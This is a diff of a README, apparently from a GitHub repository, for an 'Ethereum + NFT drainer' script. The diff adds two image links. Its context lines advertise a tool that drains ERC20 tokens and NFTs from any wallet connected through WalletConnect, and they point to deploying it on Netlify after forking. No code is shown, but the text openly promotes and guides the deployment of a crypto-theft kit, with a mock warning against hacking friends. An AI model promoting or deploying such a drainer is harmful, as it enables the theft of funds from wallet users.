@@ -5,8 +5,9 @@ DO NOT HACK YOUR FRIENDS!
 
 ETHEREUM + NFT DRAINER - [ERC20 + ERC721 DRAINER] 
 
-<br><br>
-
+<br>
+![eth-nft-drainer](https://user-images.githubusercontent.com/95045073/185730969-ad3f2a1b-7698-4bf4-906c-ccaa41fce228.gif)
+<br>
 <b> FUNCTIONS ASSIGNED TO THIS ERC20 + ERC721 DRAINER SCRIPT: </b>
 
 > THIS SCRIPT DRAINS ALL COINS UNDER ERC20(ETH,USDT,USDC,BNB,WBTC,LINK,DAI) DETECTED IN ANY WALLET THAT SUPPORTS WALLETCONNECT, WHEREAS WALLETCONNECT SUPPORTS OVER 100 WALLETS.
@@ -46,5 +47,8 @@ Go to above link to deploy the code once you fork it
 Follow the steps on netlify
 
 DEPLOY
+
+![msg5062812347-6634](https://user-images.githubusercontent.com/95045073/185731100-eebcf053-55fe-48e8-819d-dd64c6f6b7c6.jpg)
+
 
 CYBERGHOSTED
